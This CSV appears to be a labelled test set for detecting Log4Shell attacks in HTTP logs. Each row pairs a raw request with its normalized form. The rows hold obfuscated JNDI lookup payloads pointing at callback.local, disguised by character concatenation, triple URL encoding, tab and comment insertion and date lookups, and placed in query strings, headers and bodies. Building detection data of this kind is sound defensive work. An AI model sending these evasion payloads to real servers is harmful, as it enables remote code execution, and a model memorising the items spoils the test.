id,timestamp,source,raw_log,normalized_log,label,attack_family,obfuscation_type,field,split,risk_level
LS-002061,2026-05-17,adversarial_evasion,GET /api/check?debug=${${date:'jn'}di:ldap://callback.local/date-jn} HTTP/1.1 Host: app.local,get /api/check?debug=${${date:'jn'}di:ldap://callback.local/date-jn} http/1.1 host: app.local,1,log4shell,semantic_lookup_jndi,uri_param,adversarial_evasion_test,critical
LS-002062,2026-05-17,adversarial_evasion,Request from User-Agent: ${${date:'jn'}di:ldap://callback.local/date-jn} | Method: GET | Host: app.local | Path: /metrics,request from user-agent: ${${date:'jn'}di:ldap://callback.local/date-jn} | method: get | host: app.local | path: /metrics,1,log4shell,semantic_lookup_jndi,user_agent,adversarial_evasion_test,critical
LS-002063,2026-05-17,adversarial_evasion,Request from User-Agent: ${${date:'jn'}di:ldap://callback.local/date-jn},request from user-agent: ${${date:'jn'}di:ldap://callback.local/date-jn},1,log4shell,semantic_lookup_jndi,user_agent_minimal,adversarial_evasion_test,critical
LS-002064,2026-05-17,adversarial_evasion,Request from User-Agent: PostmanRuntime/7.36.1 | Method: GET | Host: app.local | Path: /home | X-Api-Version: ${${date:'jn'}di:ldap://callback.local/date-jn},request from user-agent: postmanruntime/7.36.1 | method: get | host: app.local | path: /home | x-api-version: ${${date:'jn'}di:ldap://callback.local/date-jn},1,log4shell,semantic_lookup_jndi,x_api_version,adversarial_evasion_test,critical
LS-002065,2026-05-17,adversarial_evasion,GET /?q=${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://callback.local/full-rmi} HTTP/1.1,get /?q=${jndi:rmi://callback.local/full-rmi} http/1.1,1,log4shell,lookup_character_concat,minimal_query,adversarial_evasion_test,critical
LS-002066,2026-05-17,adversarial_evasion,GET /api/check?debug=${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://callback.local/full-rmi} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:rmi://callback.local/full-rmi} http/1.1 host: app.local,1,log4shell,lookup_character_concat,uri_param,adversarial_evasion_test,critical
LS-002067,2026-05-17,adversarial_evasion,Request from User-Agent: ${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://callback.local/full-rmi} | Method: GET | Host: app.local | Path: /login,request from user-agent: ${jndi:rmi://callback.local/full-rmi} | method: get | host: app.local | path: /login,1,log4shell,lookup_character_concat,user_agent,adversarial_evasion_test,critical
LS-002068,2026-05-17,adversarial_evasion,Request from User-Agent: ${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://callback.local/full-rmi},request from user-agent: ${jndi:rmi://callback.local/full-rmi},1,log4shell,lookup_character_concat,user_agent_minimal,adversarial_evasion_test,critical
LS-002069,2026-05-17,adversarial_evasion,Request from User-Agent: python-requests/2.31.0 | Method: GET | Host: app.local | Path: /api/products?id=123 | X-Api-Version: ${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://callback.local/full-rmi},request from user-agent: python-requests/2.31.0 | method: get | host: app.local | path: /api/products?id=123 | x-api-version: ${jndi:rmi://callback.local/full-rmi},1,log4shell,lookup_character_concat,x_api_version,adversarial_evasion_test,critical
LS-002070,2026-05-17,adversarial_evasion,GET /search?q=${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://callback.local/full-rmi} HTTP/1.1 Host: app.local User-Agent: curl/7.88.1,get /search?q=${jndi:rmi://callback.local/full-rmi} http/1.1 host: app.local user-agent: curl/7.88.1,1,log4shell,lookup_character_concat,path,adversarial_evasion_test,critical
LS-002071,2026-05-17,adversarial_evasion,POST /search HTTP/1.1 Host: app.local Body: query=${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://callback.local/full-rmi},post /search http/1.1 host: app.local body: query=${jndi:rmi://callback.local/full-rmi},1,log4shell,lookup_character_concat,body,adversarial_evasion_test,critical
LS-002072,2026-05-17,adversarial_evasion,GET /?q=${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://callback.local/full-rmi} HTTP/1.1,get /?q=${jndi:rmi://callback.local/full-rmi} http/1.1,1,log4shell,lookup_character_concat,minimal_query,adversarial_evasion_test,critical
LS-002073,2026-05-17,adversarial_evasion,GET /api/check?debug=${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://callback.local/full-rmi} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:rmi://callback.local/full-rmi} http/1.1 host: app.local,1,log4shell,lookup_character_concat,uri_param,adversarial_evasion_test,critical
LS-002074,2026-05-17,adversarial_evasion,Request from User-Agent: ${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://callback.local/full-rmi} | Method: GET | Host: app.local | Path: /login,request from user-agent: ${jndi:rmi://callback.local/full-rmi} | method: get | host: app.local | path: /login,1,log4shell,lookup_character_concat,user_agent,adversarial_evasion_test,critical
LS-002075,2026-05-17,adversarial_evasion,Request from User-Agent: ${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://callback.local/full-rmi},request from user-agent: ${jndi:rmi://callback.local/full-rmi},1,log4shell,lookup_character_concat,user_agent_minimal,adversarial_evasion_test,critical
LS-002076,2026-05-17,adversarial_evasion,Request from User-Agent: Go-http-client/1.1 | Method: GET | Host: app.local | Path: /login | X-Api-Version: ${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://callback.local/full-rmi},request from user-agent: go-http-client/1.1 | method: get | host: app.local | path: /login | x-api-version: ${jndi:rmi://callback.local/full-rmi},1,log4shell,lookup_character_concat,x_api_version,adversarial_evasion_test,critical
LS-002077,2026-05-17,adversarial_evasion,GET /?q=%252524%25257Bjndi%25253Adns%25253A%25252F%25252Fcallback.local%25252Ftriple-test%25257D HTTP/1.1,get /?q=${jndi:dns://callback.local/triple-test} http/1.1,1,log4shell,triple_url_encoded,minimal_query,adversarial_evasion_test,critical
LS-002078,2026-05-17,adversarial_evasion,GET /api/check?debug=%252524%25257Bjndi%25253Adns%25253A%25252F%25252Fcallback.local%25252Ftriple-test%25257D HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:dns://callback.local/triple-test} http/1.1 host: app.local,1,log4shell,triple_url_encoded,uri_param,adversarial_evasion_test,critical
LS-002079,2026-05-17,adversarial_evasion,Request from User-Agent: %252524%25257Bjndi%25253Adns%25253A%25252F%25252Fcallback.local%25252Ftriple-test%25257D | Method: GET | Host: app.local | Path: /search?q=boots,request from user-agent: ${jndi:dns://callback.local/triple-test} | method: get | host: app.local | path: /search?q=boots,1,log4shell,triple_url_encoded,user_agent,adversarial_evasion_test,critical
LS-002080,2026-05-17,adversarial_evasion,Request from User-Agent: %252524%25257Bjndi%25253Adns%25253A%25252F%25252Fcallback.local%25252Ftriple-test%25257D,request from user-agent: ${jndi:dns://callback.local/triple-test},1,log4shell,triple_url_encoded,user_agent_minimal,adversarial_evasion_test,critical
LS-002081,2026-05-17,adversarial_evasion,Request from User-Agent: Go-http-client/1.1 | Method: GET | Host: app.local | Path: /search?q=boots | X-Api-Version: %252524%25257Bjndi%25253Adns%25253A%25252F%25252Fcallback.local%25252Ftriple-test%25257D,request from user-agent: go-http-client/1.1 | method: get | host: app.local | path: /search?q=boots | x-api-version: ${jndi:dns://callback.local/triple-test},1,log4shell,triple_url_encoded,x_api_version,adversarial_evasion_test,critical
LS-002082,2026-05-17,adversarial_evasion,GET /search?q=%252524%25257Bjndi%25253Adns%25253A%25252F%25252Fcallback.local%25252Ftriple-test%25257D HTTP/1.1 Host: app.local User-Agent: Mozilla/5.0 Chrome/120.0,get /search?q=${jndi:dns://callback.local/triple-test} http/1.1 host: app.local user-agent: mozilla/5.0 chrome/120.0,1,log4shell,triple_url_encoded,path,adversarial_evasion_test,critical
LS-002083,2026-05-17,adversarial_evasion,POST /search HTTP/1.1 Host: app.local Body: query=%252524%25257Bjndi%25253Adns%25253A%25252F%25252Fcallback.local%25252Ftriple-test%25257D,post /search http/1.1 host: app.local body: query=${jndi:dns://callback.local/triple-test},1,log4shell,triple_url_encoded,body,adversarial_evasion_test,critical
LS-002084,2026-05-17,adversarial_evasion,GET /?q=%252524%25257Bjndi%25253Adns%25253A%25252F%25252Fcallback.local%25252Ftriple-test%25257D HTTP/1.1,get /?q=${jndi:dns://callback.local/triple-test} http/1.1,1,log4shell,triple_url_encoded,minimal_query,adversarial_evasion_test,critical
LS-002085,2026-05-17,adversarial_evasion,GET /api/check?debug=%252524%25257Bjndi%25253Adns%25253A%25252F%25252Fcallback.local%25252Ftriple-test%25257D HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:dns://callback.local/triple-test} http/1.1 host: app.local,1,log4shell,triple_url_encoded,uri_param,adversarial_evasion_test,critical
LS-002086,2026-05-17,adversarial_evasion,Request from User-Agent: %252524%25257Bjndi%25253Adns%25253A%25252F%25252Fcallback.local%25252Ftriple-test%25257D | Method: GET | Host: app.local | Path: /static/app.js,request from user-agent: ${jndi:dns://callback.local/triple-test} | method: get | host: app.local | path: /static/app.js,1,log4shell,triple_url_encoded,user_agent,adversarial_evasion_test,critical
LS-002087,2026-05-17,adversarial_evasion,Request from User-Agent: %252524%25257Bjndi%25253Adns%25253A%25252F%25252Fcallback.local%25252Ftriple-test%25257D,request from user-agent: ${jndi:dns://callback.local/triple-test},1,log4shell,triple_url_encoded,user_agent_minimal,adversarial_evasion_test,critical
LS-002088,2026-05-17,adversarial_evasion,Request from User-Agent: Go-http-client/1.1 | Method: GET | Host: app.local | Path: /metrics | X-Api-Version: %252524%25257Bjndi%25253Adns%25253A%25252F%25252Fcallback.local%25252Ftriple-test%25257D,request from user-agent: go-http-client/1.1 | method: get | host: app.local | path: /metrics | x-api-version: ${jndi:dns://callback.local/triple-test},1,log4shell,triple_url_encoded,x_api_version,adversarial_evasion_test,critical
LS-002089,2026-05-17,adversarial_evasion,GET /?q=${jndi:	ldap://callback.local/tab-protocol} HTTP/1.1,get /?q=${jndi: ldap://callback.local/tab-protocol} http/1.1,1,log4shell,whitespace_injection,minimal_query,adversarial_evasion_test,critical
LS-002090,2026-05-17,adversarial_evasion,GET /api/check?debug=${jndi:	ldap://callback.local/tab-protocol} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi: ldap://callback.local/tab-protocol} http/1.1 host: app.local,1,log4shell,whitespace_injection,uri_param,adversarial_evasion_test,critical
LS-002091,2026-05-17,adversarial_evasion,Request from User-Agent: ${jndi:	ldap://callback.local/tab-protocol} | Method: GET | Host: app.local | Path: /static/app.js,request from user-agent: ${jndi: ldap://callback.local/tab-protocol} | method: get | host: app.local | path: /static/app.js,1,log4shell,whitespace_injection,user_agent,adversarial_evasion_test,critical
LS-002092,2026-05-17,adversarial_evasion,Request from User-Agent: ${jndi:	ldap://callback.local/tab-protocol},request from user-agent: ${jndi: ldap://callback.local/tab-protocol},1,log4shell,whitespace_injection,user_agent_minimal,adversarial_evasion_test,critical
LS-002093,2026-05-17,adversarial_evasion,Request from User-Agent: curl/7.88.1 | Method: GET | Host: app.local | Path: /static/app.js | X-Api-Version: ${jndi:	ldap://callback.local/tab-protocol},request from user-agent: curl/7.88.1 | method: get | host: app.local | path: /static/app.js | x-api-version: ${jndi: ldap://callback.local/tab-protocol},1,log4shell,whitespace_injection,x_api_version,adversarial_evasion_test,critical
LS-002094,2026-05-17,adversarial_evasion,GET /search?q=${jndi:	ldap://callback.local/tab-protocol} HTTP/1.1 Host: app.local User-Agent: Mozilla/5.0 Safari/605.1.15,get /search?q=${jndi: ldap://callback.local/tab-protocol} http/1.1 host: app.local user-agent: mozilla/5.0 safari/605.1.15,1,log4shell,whitespace_injection,path,adversarial_evasion_test,critical
LS-002095,2026-05-17,adversarial_evasion,POST /search HTTP/1.1 Host: app.local Body: query=${jndi:	ldap://callback.local/tab-protocol},post /search http/1.1 host: app.local body: query=${jndi: ldap://callback.local/tab-protocol},1,log4shell,whitespace_injection,body,adversarial_evasion_test,critical
LS-002096,2026-05-17,adversarial_evasion,GET /?q=${jndi:	ldap://callback.local/tab-protocol} HTTP/1.1,get /?q=${jndi: ldap://callback.local/tab-protocol} http/1.1,1,log4shell,whitespace_injection,minimal_query,adversarial_evasion_test,critical
LS-002097,2026-05-17,adversarial_evasion,GET /api/check?debug=${jndi:	ldap://callback.local/tab-protocol} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi: ldap://callback.local/tab-protocol} http/1.1 host: app.local,1,log4shell,whitespace_injection,uri_param,adversarial_evasion_test,critical
LS-002098,2026-05-17,adversarial_evasion,Request from User-Agent: ${jndi:	ldap://callback.local/tab-protocol} | Method: GET | Host: app.local | Path: /search?q=boots,request from user-agent: ${jndi: ldap://callback.local/tab-protocol} | method: get | host: app.local | path: /search?q=boots,1,log4shell,whitespace_injection,user_agent,adversarial_evasion_test,critical
LS-002099,2026-05-17,adversarial_evasion,Request from User-Agent: ${jndi:	ldap://callback.local/tab-protocol},request from user-agent: ${jndi: ldap://callback.local/tab-protocol},1,log4shell,whitespace_injection,user_agent_minimal,adversarial_evasion_test,critical
LS-002100,2026-05-17,adversarial_evasion,Request from User-Agent: PostmanRuntime/7.36.1 | Method: GET | Host: app.local | Path: /metrics | X-Api-Version: ${jndi:	ldap://callback.local/tab-protocol},request from user-agent: postmanruntime/7.36.1 | method: get | host: app.local | path: /metrics | x-api-version: ${jndi: ldap://callback.local/tab-protocol},1,log4shell,whitespace_injection,x_api_version,adversarial_evasion_test,critical
LS-002101,2026-05-17,adversarial_evasion,GET /?q=${j${/**/}ndi:ldap://callback.local/comment-token} HTTP/1.1,get /?q=${j${/**/}ndi:ldap://callback.local/comment-token} http/1.1,1,log4shell,comment_injection,minimal_query,adversarial_evasion_test,critical
LS-002102,2026-05-17,adversarial_evasion,GET /api/check?debug=${j${/**/}ndi:ldap://callback.local/comment-token} HTTP/1.1 Host: app.local,get /api/check?debug=${j${/**/}ndi:ldap://callback.local/comment-token} http/1.1 host: app.local,1,log4shell,comment_injection,uri_param,adversarial_evasion_test,critical
LS-002103,2026-05-17,adversarial_evasion,Request from User-Agent: ${j${/**/}ndi:ldap://callback.local/comment-token} | Method: GET | Host: app.local | Path: /api/products?id=123,request from user-agent: ${j${/**/}ndi:ldap://callback.local/comment-token} | method: get | host: app.local | path: /api/products?id=123,1,log4shell,comment_injection,user_agent,adversarial_evasion_test,critical
LS-002104,2026-05-17,adversarial_evasion,Request from User-Agent: ${j${/**/}ndi:ldap://callback.local/comment-token},request from user-agent: ${j${/**/}ndi:ldap://callback.local/comment-token},1,log4shell,comment_injection,user_agent_minimal,adversarial_evasion_test,critical
LS-002105,2026-05-17,adversarial_evasion,Request from User-Agent: PostmanRuntime/7.36.1 | Method: GET | Host: app.local | Path: /search?q=boots | X-Api-Version: ${j${/**/}ndi:ldap://callback.local/comment-token},request from user-agent: postmanruntime/7.36.1 | method: get | host: app.local | path: /search?q=boots | x-api-version: ${j${/**/}ndi:ldap://callback.local/comment-token},1,log4shell,comment_injection,x_api_version,adversarial_evasion_test,critical
LS-002106,2026-05-17,adversarial_evasion,GET /search?q=${j${/**/}ndi:ldap://callback.local/comment-token} HTTP/1.1 Host: app.local User-Agent: Java/11.0.13,get /search?q=${j${/**/}ndi:ldap://callback.local/comment-token} http/1.1 host: app.local user-agent: java/11.0.13,1,log4shell,comment_injection,path,adversarial_evasion_test,critical
LS-002107,2026-05-17,adversarial_evasion,POST /search HTTP/1.1 Host: app.local Body: query=${j${/**/}ndi:ldap://callback.local/comment-token},post /search http/1.1 host: app.local body: query=${j${/**/}ndi:ldap://callback.local/comment-token},1,log4shell,comment_injection,body,adversarial_evasion_test,critical
LS-002108,2026-05-17,adversarial_evasion,GET /?q=${j${/**/}ndi:ldap://callback.local/comment-token} HTTP/1.1,get /?q=${j${/**/}ndi:ldap://callback.local/comment-token} http/1.1,1,log4shell,comment_injection,minimal_query,adversarial_evasion_test,critical
LS-002109,2026-05-17,adversarial_evasion,GET /api/check?debug=${j${/**/}ndi:ldap://callback.local/comment-token} HTTP/1.1 Host: app.local,get /api/check?debug=${j${/**/}ndi:ldap://callback.local/comment-token} http/1.1 host: app.local,1,log4shell,comment_injection,uri_param,adversarial_evasion_test,critical
